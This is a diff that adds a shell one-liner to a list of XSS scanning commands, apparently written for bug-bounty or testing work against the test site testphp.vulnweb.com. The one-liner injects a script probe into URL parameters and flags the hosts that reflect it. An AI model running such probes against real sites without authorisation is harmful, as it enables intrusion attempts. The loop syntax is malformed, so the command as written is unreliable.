@@ -1,5 +1,11 @@
 ## XSS One-Liners
 
+### Tools: gau, qsreplace
+
+```
+gau testphp.vulnweb.com --threads 5 | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>//' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+```
+
 
 ### Tools: gau, gf, uro, httpx, Gxss, dalfox
 
